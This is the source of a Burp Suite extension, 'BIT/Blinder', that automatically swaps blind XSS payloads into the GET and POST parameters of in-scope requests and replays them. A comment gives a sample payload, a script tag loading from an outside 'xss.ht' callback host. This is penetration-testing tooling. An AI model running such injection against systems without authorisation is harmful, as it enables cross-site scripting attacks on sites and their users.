from burp import IBurpExtender
from burp import IHttpListener
from burp import IMessageEditorTabFactory
from burp import IMessageEditorTab
from socket import gethostbyname
from random import randint
import datetime
import sys


class URL(object):
	PARAM_URL = 0;
	PARAM_BODY = 1
	PARAM_COOKIE = 2
	PARAM_XML = 3
	PARAM_XML_ATTR = 4
	PARAM_MULTIPART_ATTR = 5
	PARAM_JSON = 6


################# USER SETTINGS ####################

OP_RAND_PAYLOAD_INJECTION = 1 # Enable this if you want to randomize your payload selection
                              # By disabling this the tool will select the first payload only

OP_INJECTION_PARAMS = [ # Those are the types of paramter that the tool will replace        
	URL.PARAM_URL,        # GET Paramsters
	URL.PARAM_BODY        # POST Parameters
]                       # DON'T EDIT THIS UNLESS YOU KNOW WHAT ARE YOU DOING


OP_INJECTION_PAYLOADS_LIST = [ # LIST OF BLIND XSS PAYLOADS 
	'XXXXXXXXXXXXXXXXXX',        # edit this to your paylod ex("><script src="username.xss.ht"><script>)
	'YYYYYYYYYYYYYYYYYY',        # you can set more than one payload however this will require OP_RAND_PAYLOAD_INJECTION = 1    
]                              # DON'T EDIT THIS3 UNLESS YOU KNOW WHAT ARE YOU DOING 

################# USER SETTINGS ####################




################ FOR DEBUGGING #####################
OP_DEBUG_MODE		= 0
OP_DEBUG_SERVER		= "127.0.0.1"
OP_DEBUG_PORT		= 80
OP_DEBUG_USE_HTTPS	= 0
OP_SHOW_OUT_OF_SCOPE	= 0
################ FOR DEBUGGING #####################



class BurpExtender(IBurpExtender,IHttpListener):

	def registerExtenderCallbacks(self,callbacks):
		self.callbacks  = callbacks
		self.callbacks.setExtensionName("BIT/Blinder")
		self.callbacks.registerHttpListener(self)
		sys.stdout 		= self.callbacks.getStdout()
		self.helpers 	= self.callbacks.getHelpers()
		
		print("*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*")
		print("-  Developer: Ahmed Ezzat (BitTheByte)      -")
		print("-  Github:    https://github.com/BitTheByte -")
		print("-  Version:   0.03b                         -")
		print("*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*")
		print("[WARNING] MAKE SURE TO EDIT THE SETTINGS BEFORE USE")
		print("[WARNING] THIS TOOL WILL WORK FOR IN-SCOPE ITEMS ONLY")
		print("[WARNING] THIS TOOL WILL CONSUME TOO MUCH BANDWIDTH")

		return


	def processHttpMessage(self, flags, isRequest, rawData):

		if not isRequest: return

		request 	= rawData.getRequest()
		requestInfo 	= self.helpers.analyzeRequest(rawData)
		url 		= requestInfo.getUrl()


		if not self.callbacks.isInScope(url):
			if OP_SHOW_OUT_OF_SCOPE:
				print("[-] %s is out of scope" % url)
			return

		https     = 1 if 'https' in requestInfo.url.getProtocol() else 0
		body 	  = request[requestInfo.getBodyOffset():]
		path 	  = requestInfo.url.getPath()
		host 	  = requestInfo.url.getHost()
		port      = requestInfo.url.port
		method    = requestInfo.getMethod()
		headers   = requestInfo.getHeaders()
		paramters = requestInfo.getParameters()
		vparams   = [p for p in paramters if p.getType() in OP_INJECTION_PARAMS]

		req_time  = datetime.datetime.today().strftime('%m/%d|%H:%M:%S') 

		print("====================================================")
		print("[{}] HOST: %s".format(req_time) % host)
		print("[{}] PATH: %s".format(req_time) % path)
		print("[{}] PORT: %i".format(req_time) % port)
		print("[{}] METH: %s".format(req_time) % method)
		print("[{}] HTTP: %i".format(req_time) % (not https))
		print("[{}] INJC: %s".format(req_time) % len(vparams) )
		print("====================================================")

		new_request = request
		new_paramters_value = []

		for paramter in vparams:
			name  =  paramter.getName()
			value = paramter.getValue()
			ptype = paramter.getType()

			if OP_RAND_PAYLOAD_INJECTION:
				payload = OP_INJECTION_PAYLOADS_LIST[randint(0, len(OP_INJECTION_PAYLOADS_LIST)-1)]
			else:
				payload = OP_INJECTION_PAYLOADS_LIST[0]

			new_paramters_value.append(
				self.helpers.buildParameter(name, payload, ptype)
			)

		for new_paramter in new_paramters_value:
			name  = new_paramter.getName()
			value = new_paramter.getValue()
			ptype = new_paramter.getType()

			updated = self.helpers.updateParameter(new_request, new_paramter)
			if OP_DEBUG_MODE:
				self.callbacks.makeHttpRequest(gethostbyname(OP_DEBUG_SERVER), OP_DEBUG_PORT, OP_DEBUG_USE_HTTPS, updated )
			else:
				self.callbacks.makeHttpRequest(gethostbyname(host), port, https, updated )
		return
